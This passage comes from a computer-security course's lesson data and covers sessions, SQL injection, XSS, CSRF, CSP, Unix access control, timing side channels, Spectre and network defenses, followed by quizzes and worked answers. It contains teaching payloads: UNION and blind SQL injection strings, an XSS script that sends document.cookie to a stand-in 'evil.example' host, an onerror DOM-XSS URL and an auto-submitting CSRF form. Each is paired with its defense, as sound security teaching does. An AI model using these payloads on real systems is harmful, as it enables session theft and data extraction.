<p>HTTP is stateless: each request stands alone. To remember that you logged in, the server creates a <strong>session</strong>, a record on the server, and gives the browser its ID in a <strong>cookie</strong>, a name–value pair the browser stores and sends back with every later request to that site. The response that logs you in includes a header like:</p>
<pre data-label="HTTP"><code>Set-Cookie: session=Q2F0cyBhcmUgbmljZS4...; Secure; HttpOnly; SameSite=Lax; Path=/</code></pre>
<p>Whoever presents the session ID <em>is</em> you, so it must be unguessable (from <code>secrets.token_urlsafe(32)</code>: 32 random bytes, 43 characters) and well guarded. The attributes help: <strong>Secure</strong> sends the cookie only over HTTPS, so it can't be read on the network; <strong>HttpOnly</strong> hides it from JavaScript, so an XSS bug can't simply read it; <strong>SameSite</strong> controls whether it is sent on requests that other sites cause (below). Servers should also issue a new session ID at login, so that an ID an attacker planted beforehand (<em>session fixation</em>) becomes useless, and should expire sessions.</p>

<h3>SQL injection in depth</h3>
<p>CS 340 Lesson 3 showed that pasting input into SQL lets the input change the query's structure, and that placeholders fix it. Attackers get more than "return every row". Here is a shop's search, built by concatenation, on a database that also holds a users table:</p>
<pre><code>import sqlite3
db = sqlite3.connect(":memory:")
db.executescript("""
CREATE TABLE products (id INTEGER PRIMARY KEY, name TEXT, price REAL);
CREATE TABLE users (name TEXT, pwhash TEXT);
INSERT INTO products VALUES (1, 'red pen', 1.5), (2, 'blue pen', 1.25), (3, 'notebook', 3.0);
INSERT INTO users VALUES ('admin', 'pbkdf2_sha256$600000$9f...'), ('ana', 'pbkdf2_sha256$600000$41...');
""")

def search_unsafe(term):
    q = "SELECT name, price FROM products WHERE name LIKE '%" + term + "%'"
    return db.execute(q).fetchall()

print(search_unsafe("pen"))   # [('red pen', 1.5), ('blue pen', 1.25)]
print(search_unsafe("zzz' UNION SELECT name, pwhash FROM users --"))   # [('admin', 'pbkdf2_sha256$600000$9f...'), ('ana', 'pbkdf2_sha256$600000$41...')]</code></pre>
<p>The quote closes the string, <code>UNION SELECT</code> appends rows from any table with the same number of columns, and <code>--</code> comments out the rest of the original query. The search page now lists password hashes. When a page shows no query results at all, attackers use <strong>blind injection</strong>: they add a condition such as <code>AND substr((SELECT pwhash FROM users WHERE name = 'admin'), 1, 1) = 'p'</code> and watch whether the page behaves as if the search found something, extracting data one yes-or-no answer at a time, or they make the database pause and time the response. Neither needs the results to be displayed.</p>
<p><strong>Second-order injection</strong> is subtler: input is stored safely, with a parameter, and later read back and pasted into another query by code that trusts "our own data". A user named <code>x' OR '1'='1</code> is harmless at sign-up and dangerous in the nightly report. Data from your own database is still untrusted if a user ever wrote it.</p>
<p>The defenses, in order of importance:</p>
<ul>
<li><strong>Parameterized queries</strong> for every value, everywhere, including values read from your own tables. With <code>execute("... WHERE name LIKE ?", ("%" + term + "%",))</code> the UNION attack returns <code>[]</code>.</li>
<li><strong>Allowlists</strong> for the parts that can't be parameters, such as column names in <code>ORDER BY</code> (CS 340 Lesson 3). In a <code>LIKE</code> pattern, escape <code>%</code> and <code>_</code> if the user's text should match literally.</li>
<li><strong>Least privilege</strong> for the database account (Lesson 1): a search page that connects as a read-only user of the products table can't read <code>users</code> even if injection slips through.</li>
<li>Object-relational mappers parameterize by default, but most also offer a "raw SQL" escape hatch, where the old bug returns.</li>
</ul>

<h3>Cross-site scripting</h3>
<p><strong>Cross-site scripting</strong> (XSS) is injection into a page: attacker-supplied text is placed in HTML and the browser runs it as script, <em>with the page's origin</em>, so the same-origin policy now works for the attacker. The script can read the page, act as the user, and send data anywhere. Three kinds: <em>stored</em> XSS (a comment containing a script, shown to every visitor), <em>reflected</em> XSS (a script in a link's query string that the page echoes back) and <em>DOM-based</em> XSS (the page's own JavaScript copies text from the URL into the page with <code>innerHTML</code>).</p>
<p>The defense is <strong>output encoding</strong> appropriate to the context where the text lands:</p>
<pre><code>import html
comment = '&lt;script&gt;fetch("https://evil.example/?c=" + document.cookie)&lt;/script&gt;'
print(html.escape(comment))   # &amp;lt;script&amp;gt;fetch(&amp;quot;https://evil.example/?c=&amp;quot; + document.cookie)&amp;lt;/script&amp;gt;</code></pre>
<table>
<tr><th>Where the text goes</th><th>What to do</th></tr>
<tr><td>Element text: <code>&lt;p&gt;TEXT&lt;/p&gt;</code></td><td>Escape <code>&amp; &lt; &gt;</code> (and quotes, for safety)</td></tr>
<tr><td>Attribute: <code>&lt;input value="TEXT"&gt;</code></td><td>Escape, including <code>"</code> and <code>'</code>, and always quote the attribute</td></tr>
<tr><td>URL: <code>&lt;a href="TEXT"&gt;</code></td><td>Allow only <code>http:</code>, <code>https:</code> or relative URLs, then escape; <code>javascript:alert(1)</code> contains nothing to escape</td></tr>
<tr><td>Inside a script</td><td>Avoid; pass data as JSON in a data attribute, or use a vetted encoder</td></tr>
<tr><td>In the page's own JavaScript</td><td>Set <code>textContent</code>, never <code>innerHTML</code>, with untrusted text</td></tr>
</table>
<p>The attribute row explains why quotes must be escaped: an unescaped value <code>" onmouseover="alert(1)</code> would close the attribute and add an event handler. Each escape is a <em>character reference</em>, which the browser shows as the character instead of reading it as markup: <code>&amp;lt;</code> by name, and <code>&amp;#x27;</code> by number, the character whose code is hexadecimal 27 (39, the apostrophe <code>'</code>). <code>html.escape</code> also turns <code>'</code> into <code>&amp;#x27;</code>; it uses the number because the name <code>&amp;apos;</code> wasn't part of HTML 4, so older browsers don't know it. Template engines such as Jinja2 and React escape by default; the bugs appear where a developer turns that off ("this field is safe HTML") or builds HTML by string concatenation.</p>

<h3>Cross-site request forgery</h3>
<p>Suppose you are logged in to <code>bank.example</code> and visit a page on <code>evil.example</code> containing:</p>
<pre data-label="HTML"><code>&lt;form action="https://bank.example/transfer" method="POST"&gt;
  &lt;input name="to" value="eve"&gt; &lt;input name="amount" value="1000"&gt;
&lt;/form&gt;
&lt;script&gt;document.forms[0].submit()&lt;/script&gt;</code></pre>
<p>The browser submits the form to the bank and, under the old rules, attaches your bank session cookie. The bank sees an authenticated request and performs it. The attacker never reads anything (the SOP isn't violated); they only cause a request. This is <strong>cross-site request forgery</strong> (CSRF). Defenses:</p>
<ul>
<li><strong>SameSite cookies.</strong> <code>SameSite=Strict</code>: the browser never sends the cookie on requests caused by another site. <code>SameSite=Lax</code>: it sends it only on top-level navigations with safe methods, such as following a link (a GET), not on a cross-site POST. Chrome treats cookies without the attribute as Lax, but don't rely on browser defaults: set it.</li>
<li><strong>CSRF tokens.</strong> Every form includes a secret value tied to the session, which the attacker's page can't read (the SOP prevents it) and so can't include. The server rejects state-changing requests without the right token:</li>
</ul>
<pre><code>import hmac, secrets
SERVER_KEY = secrets.token_bytes(32)

def csrf_token(session_id):
    return hmac.new(SERVER_KEY, session_id.encode(), "sha256").hexdigest()

def check_csrf(session_id, submitted):
    return hmac.compare_digest(csrf_token(session_id), submitted)

sid = secrets.token_urlsafe(32)
print(check_csrf(sid, csrf_token(sid)), check_csrf(sid, "0" * 64))   # True False</code></pre>
<ul>
<li><strong>Checking the <code>Origin</code> header</strong>, which browsers add to cross-site POSTs, and never changing state on GET requests (CS 240 Lesson 6: GET reads).</li>
</ul>

<h3>Content Security Policy</h3>
<p>Escaping must be right everywhere; a policy can limit the damage where it isn't. A <strong>Content Security Policy</strong> (CSP) is a response header telling the browser which sources of script, style, images and frames the page may use:</p>
<pre data-label="HTTP"><code>Content-Security-Policy: default-src 'self'; script-src 'self' 'nonce-4f9c2a'; object-src 'none'; frame-ancestors 'none'</code></pre>
<p>With it, the browser runs only scripts loaded from the site's own origin or inline scripts carrying the random nonce attribute (<code>&lt;script nonce="4f9c2a"&gt;</code>, a fresh value per response), so an injected <code>&lt;script&gt;</code> without the nonce doesn't run; <code>frame-ancestors 'none'</code> also stops other sites framing the page to trick clicks (<em>clickjacking</em>). CSP is defense in depth, not a replacement for encoding.</p>
<p class="note">Why it matters: injection, XSS and CSRF are all the same mistake: letting data from an untrusted party be interpreted as code or as a command. Keep code and data apart, and make the browser help.</p>
`,
      terms: [
        ["Origin", "The (scheme, host, port) of a URL; the unit of isolation in the browser."],
        ["Same-origin policy", "The browser rule that a script may not read data belonging to another origin."],
        ["CORS", "Cross-origin resource sharing: response headers by which a server lets chosen other origins read its responses."],
        ["Cookie", "A name–value pair a site asks the browser to store and send back with later requests to it."],
        ["Session", "Server-side state for a logged-in user, identified by an unguessable ID usually kept in a cookie."],
        ["Secure / HttpOnly / SameSite", "Cookie attributes: send only over HTTPS; hide from JavaScript; limit sending on requests caused by other sites."],
        ["Session fixation", "An attack where the victim is made to use a session ID the attacker knows; prevented by issuing a new ID at login."],
        ["UNION-based injection", "Appending UNION SELECT to an injectable query to return rows from other tables."],
        ["Blind injection", "Extracting data through injected conditions whose truth is seen only in the page's behaviour or timing."],
        ["Second-order injection", "Stored data later pasted unsafely into a query."],
        ["Cross-site scripting (XSS)", "Injection of script into a page, which then runs with the page's origin."],
        ["Output encoding", "Escaping data for the context where it is inserted, such as HTML text, an attribute or a URL."],
        ["Cross-site request forgery (CSRF)", "Making a victim's browser send an authenticated request the victim didn't intend."],
        ["CSRF token", "A secret per-session value included in forms, which another site can't read and so can't forge."],
        ["Content Security Policy (CSP)", "A response header listing which sources of script and other content a page may use."]
      ],
      quiz: [
        { q: "Which pair has the same origin?", choices: ["http://a.example and https://a.example", "https://a.example and https://a.example:443/x", "https://a.example and https://b.a.example", "https://a.example and https://a.example:8443"], answer: 1, why: "443 is the default HTTPS port, so the scheme, host and port all match." },
        { q: "What does the same-origin policy not prevent?", choices: ["A script reading another origin's page", "A page causing the browser to send a request to another origin", "A script reading another origin's cookies", "A script reading another origin's responses"], answer: 1, why: "Sending requests is allowed; reading the results is what's restricted. CSRF uses this gap." },
        { q: "A search page shows no results, but its response time changes when an injected condition is true. What kind of attack is possible?", choices: ["None, since nothing is displayed", "Blind SQL injection", "CSRF", "XSS"], answer: 1, why: "Yes-or-no answers through behaviour or timing are enough to extract data bit by bit." },
        { q: "A profile page puts the user's homepage URL in an href after HTML-escaping it. Why is that not enough?", choices: ["Escaping is too slow", "A javascript: URL contains no characters to escape but runs script when clicked", "href can't hold URLs", "Escaping breaks URLs"], answer: 1, why: "URL context needs a scheme allowlist as well as escaping." },
        { q: "Which cookie attribute is the main defense against CSRF?", choices: ["Secure", "HttpOnly", "SameSite", "Path"], answer: 2, why: "SameSite stops the browser attaching the cookie to requests other sites cause." },
        { q: "What does Content Security Policy add if a page already escapes all output?", choices: ["Nothing", "A second layer: injected scripts without the right source or nonce won't run if an escaping mistake slips through", "Faster pages", "Encryption"], answer: 1, why: "It is defense in depth for XSS, not a replacement for encoding." }
      ],
      practice: [
        {
          q: `<p>Using the notes' <code>search_unsafe</code>, write the blind-injection test that asks whether the admin's password hash starts with <code>p</code>, and the one that asks whether it starts with <code>q</code>. What do the two calls return, and how would an attacker extract a whole hash this way? Then show that the parameterized version is immune.</p>`,
          a: `<pre><code>print(search_unsafe("pen' AND substr((SELECT pwhash FROM users WHERE name = 'admin'), 1, 1) = 'p' --"))   # [('red pen', 1.5), ('blue pen', 1.25)]
print(search_unsafe("pen' AND substr((SELECT pwhash FROM users WHERE name = 'admin'), 1, 1) = 'q' --"))   # []

def search(term):
    return db.execute("SELECT name, price FROM products WHERE name LIKE ?", ("%" + term + "%",)).fetchall()
print(search("pen' AND substr((SELECT pwhash FROM users WHERE name = 'admin'), 1, 1) = 'p' --"))   # []</code></pre><p>The pens appear exactly when the injected condition is true. Repeating for each position and each possible character (or bisecting with <code>&lt;</code>) recovers the hash in a few hundred requests. With a parameter, the whole string is just a pattern no product name contains.</p>`
        },
        {
          q: `<p>A page shows a greeting with JavaScript: <code>document.getElementById("hi").innerHTML = "Hello, " + new URLSearchParams(location.search).get("name")</code>. Which kind of XSS is this, give a URL that exploits it, and fix it.</p>`,
          a: `<p>DOM-based XSS: the page's own script copies untrusted URL text into HTML. A link such as <code>/welcome?name=&lt;img src=x onerror=alert(document.domain)&gt;</code> runs script when the image fails to load. (Browsers don't run a <code>&lt;script&gt;</code> element inserted with <code>innerHTML</code>, but event-handler attributes like <code>onerror</code> do run.) Fix: <code>element.textContent = "Hello, " + name</code>, which inserts text, never markup. The server never sees the payload if it's in the URL fragment, so server-side escaping can't help; the client code must be right, and a CSP blocks the inline handler as a second layer.</p>`
        },
        {
          q: `<p>A site sets its session cookie with <code>SameSite=Lax</code> and has a "delete account" action at <code>GET /account/delete</code>. Is it protected against CSRF? What two changes would you make?</p>`,
          a: `<p>No. Lax cookies are still sent on top-level navigations with GET, so a link or a redirect from another site to <code>/account/delete</code> carries the cookie and deletes the account. Changes: (1) make state-changing actions use POST (or DELETE), never GET; (2) require a CSRF token (and, for something this serious, re-authentication) on the request. Optionally, <code>SameSite=Strict</code> for the session cookie, at the cost of users appearing logged out when they arrive by a link from another site.</p>`
        },
        {
          q: `<p>For each design, say whether it is vulnerable and why: (a) the server stores comments raw and escapes them when rendering; (b) the server escapes comments when storing them and renders them raw; (c) the server strips the string <code>&lt;script&gt;</code> from comments and renders them raw.</p>`,
          a: `<p>(a) Safe, and the recommended design: store data as data, and encode at output for the context it goes into. (b) Safe for HTML pages, but fragile: the stored text is now HTML-encoded, so every other use (a JSON API, an email, a search index) shows <code>&amp;lt;</code> or must decode it, and any one path that forgets the convention, or any data stored before it, is unsafe. (c) Vulnerable: blocklists miss variants. <code>&lt;img src=x onerror=…&gt;</code> needs no script tag, and <code>&lt;scr&lt;script&gt;ipt&gt;</code> becomes <code>&lt;script&gt;</code> after the strip. Filtering input is not a substitute for encoding output.</p>`
        }
      ],
      sources: ["mdnsop", "owaspcs", "owasp", "pysqlite3"]
    },
    {
      id: "sc7",
      title: "Access control and side channels",
      minutes: 90,
      summary: "Subjects, objects and the access matrix; Unix users, groups, mode bits and setuid; access control lists versus capabilities, with file descriptors as capabilities; sandboxing; the confused deputy; timing side channels and constant-time comparison; and Spectre at a conceptual level.",
      notes: `
<p>Authentication (Lesson 3) says who is asking. <strong>Access control</strong> decides what they may do, and is where Lesson 1's complete mediation and least privilege become mechanisms. The second half of this lesson is about information that escapes even when every access check is right: through time.</p>

<h3>The access matrix</h3>
<p>The general model has <strong>subjects</strong> (users, or processes acting for them), <strong>objects</strong> (files, records, devices) and <strong>rights</strong> (read, write, execute, delete, grant). The <strong>access matrix</strong> has a row per subject, a column per object, and in each cell the rights that subject has on that object:</p>
<table>
<tr><th></th><th>grades.db</th><th>notes.txt</th><th>/usr/bin/python3</th></tr>
<tr><td>ana</td><td>read</td><td>read, write</td><td>execute</td></tr>
<tr><td>bob</td><td></td><td>read</td><td>execute</td></tr>
<tr><td>gradebot</td><td>read, write</td><td></td><td>execute</td></tr>
</table>
<p>Real systems never store the whole matrix, which is huge and mostly empty. They store it by column or by row:</p>
<ul>
<li>An <strong>access control list</strong> (ACL) stores each object's column: the list of who may do what to it. Checking is easy ("is ana on this file's list?"), and so is revoking access to one object. Answering "what can ana reach?" means searching every object.</li>
<li>A <strong>capability</strong> stores a row entry with the subject: an unforgeable token naming an object and some rights, which the holder presents to use the object. Possessing the capability is the permission. Delegation is natural (hand over the token), and so is least privilege (give a program exactly the tokens it needs); revoking a capability that has been copied is harder.</li>
</ul>

<h3>Unix permissions</h3>
<p>Unix uses a compact ACL. CS 310 Lesson 1 introduced the mode bits; here is the whole check. Every process runs with a user ID (uid) and a set of group IDs. Every file has an owner uid, a group, and nine permission bits: read, write, execute for the owner, the group and everyone else. When a process opens a file, the kernel:</p>
<ol>
<li>allows everything if the process's uid is 0 (<strong>root</strong>), except that execute requires at least one execute bit to be set;</li>
<li>otherwise picks <em>exactly one</em> class: owner, if the uids match; else group, if the file's group is among the process's groups; else other;</li>
<li>allows the access only if that class's bits include every right requested.</li>
</ol>
<p>Step 2 has a surprise: the owner of a file with mode <code>070</code> can't read it, even if they are in the group that can, because only the owner bits are consulted. Directories use the same bits with different meanings (CS 310 Lesson 1), and opening <code>/home/ana/notes.txt</code> needs execute (search) permission on <code>/</code>, <code>/home</code> and <code>/home/ana</code> as well (CS 310 Lesson 7's path walk). The <code>stat</code> module formats modes the way <code>ls -l</code> does:</p>
<pre><code>import stat
print(stat.filemode(0o100640))   # -rw-r-----
print(stat.filemode(0o104755))   # -rwsr-xr-x</code></pre>
<p>The leading <code>-</code> means a regular file (the <code>0o100000</code> part). The <code>s</code> in the second is the <strong>setuid</strong> bit (<code>0o4000</code>): when the file is executed, the process runs with the <em>file owner's</em> uid instead of the caller's. That is how <code>passwd</code>, owned by root, lets an ordinary user change their own password in a file only root may write. Setuid programs are privileged code that takes input from unprivileged users, so every bug in them is a path to root, and least privilege says to have as few as possible. A new file's mode is the mode the program asks for with the bits in the process's <strong>umask</strong> removed: asking for <code>0o666</code> with the common umask <code>0o022</code> gives <code>0o644</code>.</p>
<p>Unix also has a capability: the <strong>file descriptor</strong>. The permission check happens once, at <code>open</code>; afterwards, holding descriptor 3 is what lets a process read the file, and a descriptor can be passed to a child (CS 310 Lesson 1's shell did this with <code>dup2</code>) or even sent to another process. A privileged program can open a file and hand the descriptor to an unprivileged helper, which can use that one file and nothing else.</p>

<h3>Sandboxing</h3>
<p>A <strong>sandbox</strong> runs code with far less privilege than its user has, so that compromising it gains little. Examples, from coarse to fine: a separate virtual machine or container (CS 310 Lesson 8); a separate process running as an unprivileged user; a system-call filter (Linux's <em>seccomp</em> lets a process declare that from now on it will only ever call, say, <code>read</code>, <code>write</code> and <code>exit</code>, and the kernel kills it if it tries anything else); and a language-level sandbox. Browsers combine these: each site's pages are rendered in a separate low-privilege process (<em>site isolation</em>) with a system-call filter, so a memory-safety bug in the renderer (Lesson 5) still has to break out of the sandbox to reach your files. The Python that grades this course's problems runs inside WebAssembly in your browser, which can't open files or network connections unless the page gives it a way to.</p>

<h3>The confused deputy</h3>
<p>Norm Hardy's 1988 paper told of a compiler on a time-sharing system. Users could name a file for the compiler to write debugging output to. The compiler also had permission, granted by the system's administrators, to write a billing file in its own directory. A user named the billing file as the debugging output, and the compiler, acting with <em>its</em> authority on the user's behalf, overwrote it. The compiler was a <strong>confused deputy</strong>: a program with authority from two sources that used one source's authority on the other's instructions.</p>
<p>The pattern is everywhere. CSRF (Lesson 6) makes the browser a confused deputy: it holds your cookie and uses it for a request another site chose. A web server that fetches a user-supplied URL can be made to fetch <code>http://localhost/admin</code> or a cloud provider's internal metadata address, which only it can reach (<em>server-side request forgery</em>). A setuid program that opens a path the user names, checking only its own access, can be pointed at <code>/etc/shadow</code>.</p>
<p>Fixes take two forms. Make the deputy act with the requester's authority for the requester's part of the job: the setuid program checks whether the <em>real</em> user may write the path (or temporarily drops its privileges while opening it). Or use capabilities, Hardy's answer: the user passes an open file descriptor, not a name, so the deputy can only write where the user could.</p>

<h3>Timing side channels</h3>
<p>A <strong>side channel</strong> is information leaked by how a computation runs rather than by what it outputs: its time, power use, cache footprint or even sound. The simplest is timing. Comparing a secret with a guess byte by byte, stopping at the first mismatch, takes longer the more leading bytes are right:</p>
<pre><code>def leaky_equal(a, b):
    if len(a) != len(b):
        return False, 0               # lengths differ: no bytes compared
    steps = 0
    for x, y in zip(a, b):
        steps += 1
        if x != y:
            return False, steps
    return True, steps

secret = b"k9QzT2"
print(leaky_equal(secret, b"aaaaaa"))   # (False, 1)
print(leaky_equal(secret, b"kaaaaa"))   # (False, 2)
print(leaky_equal(secret, b"k9aaaa"))   # (False, 3)</code></pre>
<p>If a server checks a MAC tag or an API key this way, an attacker measures response times (averaging many requests to remove network noise) and finds the secret one byte at a time: at most 256 guesses per byte, 256 × 32 = 8,192 for a 32-byte tag instead of 2<sup>256</sup>. The programming problem simulates exactly this. The fix is a <strong>constant-time</strong> comparison, which always examines every byte and combines the differences, so its time depends only on the length: <code>hmac.compare_digest</code> in Python.</p>
<pre><code>import hmac
print(hmac.compare_digest(b"k9QzT2", b"k9QzT3"))   # False</code></pre>
<p>Timing leaks also come from data-dependent branches and memory accesses inside cryptographic code. Paul Kocher showed in 1996 that the time taken by RSA's modular exponentiation, which does extra multiplications for the 1 bits of the private exponent, reveals the exponent. Cryptographic libraries are therefore written so that neither their branches nor the addresses they access depend on secrets, another reason not to write your own.</p>

<h3>Spectre, conceptually</h3>
<p>CS 230 Lesson 6's sidebar described Spectre and Meltdown. Now the pieces fit. A processor predicts branches and runs ahead speculatively; if the guess was wrong it discards the results, but not their effect on the cache. Consider code that checks a bound before using an index:</p>
<pre data-label="C"><code>if (x &lt; array1_size)
    y = array2[array1[x] * 4096];</code></pre>
<p>An attacker first trains the branch predictor with valid values of <code>x</code>, then supplies an out-of-bounds <code>x</code>. While the processor waits to learn <code>array1_size</code>, it speculatively reads the secret byte <code>array1[x]</code> from beyond the array and loads one line of <code>array2</code> chosen by it. The factor 4096 spreads the 256 possible byte values 4,096 bytes apart, one 4 KB page each (CS 310 Lesson 6): each value then has its own cache line (64 bytes, CS 210 Lesson 7), far from the others. A multiplier of 64 would already give separate lines, but neighbouring ones, and processors <em>prefetch</em>, loading the next lines when they see an access, so the attacker couldn't tell which line was really touched. The architectural results are rolled back, but that cache line stays loaded, and timing accesses to <code>array2</code> (a cache hit is much faster than a miss, CS 210 Lesson 7) reveals which line it was, hence the secret byte. The bounds check was correct; it just wasn't respected during speculation. Defenses include speculation barriers (fence instructions) after security-critical checks, masking indexes so that even speculative accesses stay in bounds, separating mutually distrusting code into different processes (site isolation in browsers was accelerated by Spectre), and making high-resolution timers less available to web pages.</p>
<p class="note">Why it matters: access control decides who may touch what, and side channels are how secrets leak past correct checks. Both reward the same habit: ask what authority and what information each piece of code really has.</p>
`,
      terms: [
        ["Access control", "Deciding, for each request, whether a subject may perform an operation on an object."],
        ["Access matrix", "A table of the rights each subject has on each object."],
        ["Access control list (ACL)", "A list, kept with an object, of which subjects may do what to it."],
        ["Capability", "An unforgeable token naming an object and rights; holding it grants the access."],
        ["Root", "The Unix superuser, uid 0, which bypasses most permission checks."],
        ["Setuid", "A file mode bit that makes a program run with its owner's user ID rather than the caller's."],
        ["umask", "A per-process mask of permission bits removed from the mode of every new file."],
        ["Sandbox", "An environment that runs code with much less privilege than its user has, to contain compromises."],
        ["seccomp", "A Linux mechanism that restricts which system calls a process may make."],
        ["Confused deputy", "A program that uses authority it holds for one purpose on behalf of a requester who lacks it."],
        ["Server-side request forgery (SSRF)", "Making a server fetch a URL of the attacker's choosing, reaching places only the server can reach."],
        ["Side channel", "Information leaked through a computation's timing, power use, cache behaviour or similar, rather than its output."],
        ["Constant-time code", "Code whose running time and memory accesses don't depend on secret values."],
        ["Speculative execution", "A processor running instructions ahead of knowing whether they are needed, and discarding them if not."],
        ["Spectre", "Attacks that make speculatively executed code leave secret-dependent traces in the cache, read back by timing."]
      ],
      quiz: [
        { q: "A file has owner ana, group staff and mode 0o604. Ana is in staff. Can ana write it?", choices: ["Yes: the owner bits include w", "No", "Only if root", "Yes, through the group"], answer: 0, why: "6 = rw for the owner class, and ana is the owner, so only the owner bits apply." },
        { q: "A file has owner ana, group staff and mode 0o040. Ana is in staff. Can ana read it?", choices: ["Yes, through the group", "No: as owner she gets the owner bits only, which are 0", "Yes, owners can always read", "Only through an ACL"], answer: 1, why: "Unix picks exactly one class, and the owner class comes first." },
        { q: "Which is the best description of a capability?", choices: ["A list of users kept with a file", "An unforgeable token that both names an object and grants rights to it", "A password", "A user ID"], answer: 1, why: "Possession is the permission; Unix file descriptors work like this after open." },
        { q: "A web server fetches any URL a user submits, to show a preview. An attacker submits http://localhost:8080/admin/delete-all. What problem is this?", choices: ["XSS", "A confused deputy (server-side request forgery): the server uses its network position for the attacker", "SQL injection", "A side channel"], answer: 1, why: "The server can reach internal addresses the attacker can't, and is tricked into using that authority." },
        { q: "Why does an early-exit comparison of a secret tag leak information?", choices: ["It uses too much memory", "Its running time grows with the number of leading bytes that match, so a guess can be refined byte by byte", "It returns the wrong answer", "It is not constant in the length"], answer: 1, why: "Each byte can be found with at most 256 timed guesses." },
        { q: "In Spectre's bounds-check example, why doesn't the correct check prevent the leak?", choices: ["The check has a bug", "The processor speculatively executes the access before the check's outcome is known, and the cache keeps a trace after the results are discarded", "The array is too small", "Caches are encrypted"], answer: 1, why: "Speculation is rolled back architecturally but not in the cache, and timing reads the cache." }
      ],
      practice: [
        {
          q: `<p>For each request, say whether Unix allows it and why. Process: uid 1001, groups {1001, 50}. (a) read a file owned by 1000, group 50, mode 0o640; (b) write that file; (c) read a file owned by 1001, group 50, mode 0o044; (d) execute a file owned by 0, group 0, mode 0o755; (e) as uid 0, execute a file with mode 0o644.</p>`,
          a: `<p>(a) Allowed: not the owner, but in group 50, and the group digit 4 includes r. (b) Denied: the group digit has no w. (c) Denied: the process is the owner, so the owner digit 0 applies, even though group and other could read. (The owner can fix it with <code>chmod</code>, since owners may always change their files' modes.) (d) Allowed: the other digit 5 = r + x. (e) Denied: root bypasses read and write checks, but execute needs at least one x bit, and 644 has none.</p>`
        },
        {
          q: `<p>A setuid-root program <code>printlog</code> takes a filename and appends a line to it, so that users can write to the system log. Explain how a user could use it to damage the system, name the problem, and give two fixes.</p>`,
          a: `<p>The program runs as root, so it can append to any file. A user runs <code>printlog /etc/passwd</code> (or the file that lists who may use administrator commands) and adds a line of their choosing. It is a confused deputy: authority granted for writing the log is used on the user's instruction for a different object. Fixes: (1) don't take a filename at all: the program always writes to the one log file (least privilege; it may not even need to be setuid if the log is writable by a dedicated group); (2) if it must take a path, check access as the <em>real</em> user (drop privileges to the caller's uid before opening, so the kernel's check applies to them), or have the caller pass an already-open file descriptor, a capability.</p>`
        },
        {
          q: `<p>A server checks 16-byte API keys with an early-exit comparison, and an attacker can measure which of 256 guesses for a byte takes longest, using about 1,000 requests per guess to average out noise. Roughly how many requests does recovering the whole key take, compared with guessing it outright?</p>`,
          a: `<pre><code>print(16 * 256 * 1000)   # 4096000
print(f"{2**128:.1e}")   # 3.4e+38</code></pre><p>About 4 million requests, a day or two at a modest rate, against about 3.4 × 10<sup>38</sup> guesses for the whole key. The side channel turns an exponential search into a linear one, because each byte can be confirmed independently. <code>hmac.compare_digest</code> removes the signal; rate limiting and alerting on many failed attempts are useful extra layers.</p>`
        },
        {
          q: `<p>Compare ACLs and capabilities for this requirement: "a photo-printing service may read exactly the three photos a user chose, and nothing else, for the next hour." How would each model express it, and which fits better?</p>`,
          a: `<p>With ACLs, the user (or the system) would add the printing service to the ACL of each of the three photos and remember to remove it after an hour; meanwhile the service is a principal on the user's files, and any bug that makes it ask for other files is caught only if those files' ACLs exclude it. With capabilities, the user gives the service three tokens (for the web, often signed URLs: each URL names one photo, grants read, and carries an expiry, with a MAC from the storage service), and the service can read nothing it wasn't handed. Capabilities fit better: delegation of specific objects for a limited time is what they do naturally, and the service can't be confused into reading a different photo by name.</p>`
        }
      ],
      sources: ["ostep", "hardy88", "kocher96", "spectre19", "manpages"]
    },
    {
      id: "sc8",
      title: "Security in practice",
      minutes: 90,
      summary: "Network attackers and defenses: firewalls, segmentation and VPNs, and exactly what TLS does and doesn't protect; building security into development with threat modeling, code review, fuzzing and careful dependency management; detection and the base-rate problem; incident response; and coordinated disclosure, with the law and ethics of security work in a sidebar.",
      notes: `
<p>The earlier lessons each covered one kind of defense. This one is about how they come together in systems that run for years, built by teams, attacked by people you will never meet, and what to do when something goes wrong anyway.</p>

<h3>The network attacker</h3>
<p>Security protocols are designed against a network adversary who can read, drop, replay, modify and inject any packet, and send packets with any source address. (The networks course, CS 330, explains why IP and TCP give so little protection on their own.) Defenses at the network level:</p>
<ul>
<li><strong>Firewalls</strong> filter traffic at a boundary by rules on addresses, protocols and ports. A <em>stateless</em> packet filter judges each packet alone, by the first rule that matches, with a final default of deny (Lesson 1's fail-safe default). A <em>stateful</em> firewall also tracks connections, so that it can allow replies to connections started from inside while refusing new connections from outside. Python's <code>ipaddress</code> module does the address arithmetic:</li>
</ul>
<pre><code>import ipaddress
net = ipaddress.ip_network("10.20.0.0/16")
print(net.num_addresses)   # 65536
print(ipaddress.ip_address("10.20.7.9") in net, ipaddress.ip_address("10.21.0.1") in net)   # True False</code></pre>
<ul>
<li><strong>Segmentation</strong> divides a network into zones, as in Lesson 1's figure, with firewalls between them, so that an attacker who compromises one machine can't reach everything. Its modern extension, <em>zero trust</em>, drops the idea of a trusted inside altogether: every request is authenticated and authorized wherever it comes from, as if it came from the internet.</li>
<li>A <strong>VPN</strong> (virtual private network) encrypts and authenticates all traffic between a device and a network gateway (or between two sites) inside a tunnel, using protocols such as IPsec or WireGuard, so that the device behaves as if it were on the remote network. It protects traffic on the path to the gateway, not beyond it, and moves trust to the VPN's operator.</li>
</ul>

<h3>What TLS does and doesn't protect</h3>
<p>Lesson 4's TLS gives three things against the network attacker: <em>confidentiality</em> of the content, <em>integrity</em> (any change is detected), and <em>authentication of the server</em> (the certificate matches the name). It doesn't hide <strong>metadata</strong>: the IP addresses of both ends, the times and sizes of messages (which can reveal a lot: Lesson 2's practice on lengths), and usually the site's name, which the client sends in the clear in the ClientHello so the server knows which certificate to use (an extension called Encrypted Client Hello hides it where both sides support it). It says nothing about whether the server is honest: a phishing site at <code>paypa1.example</code> can have a perfectly valid certificate for its own name. And it protects data only in transit: it does nothing about a compromised server, a compromised client, or data stored unencrypted at either end. A threat model decides which of these gaps matter.</p>

<h3>Security in the development process</h3>
<p>Most vulnerabilities are ordinary bugs. Catching them belongs in the process CS 240 described, at every stage:</p>
<ul>
<li><strong>Design</strong>: threat-model every significant feature (Lesson 1), especially anything that crosses a trust boundary, parses untrusted input, or handles authentication, money or personal data.</li>
<li><strong>Code review</strong> (CS 240 Lesson 7) with security questions: where does this input come from, is it validated at the boundary, does every path check authorization, are queries parameterized and output encoded, are errors failing safe, are secrets kept out of logs and code?</li>
<li><strong>Static analysis</strong> tools that track untrusted data from sources (request parameters) to dangerous sinks (SQL execution, HTML output), plus compiler warnings and sanitizers for C and C++.</li>
